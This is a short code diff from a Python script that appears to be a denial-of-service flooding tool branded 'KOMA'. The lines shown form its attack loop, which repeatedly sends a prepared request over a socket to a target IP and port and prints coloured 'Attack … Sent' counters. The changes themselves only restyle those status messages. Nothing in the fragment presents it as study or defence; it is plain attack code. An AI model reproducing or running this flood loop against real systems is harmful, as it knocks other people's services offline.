@@ -111,13 +111,13 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("⚡\033[96m[+\033[96m]\033[32mKOMA  \033[92mAttack {0}:{1}  \033[33mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[⚡\033[37mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[33mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("⚡\033[96m[+\033[96m]\033[35mKOMA  \033[92mAttack {0}:{1}  \033[37mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[⚡\033[33mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[37mSent::..{2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("⚡\033[96m[+\033[96m]\033[36mKOMA  \033[92mAttack {0}:{1}  \033[34mSent::..{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[⚡\033[32mKOMA\033[96m]  \033[92mAttack {0}:{1}  \033[34mSent::..{2}\033[0m".format(str(ip), int(port), xx))
         
         except:
                s.close()
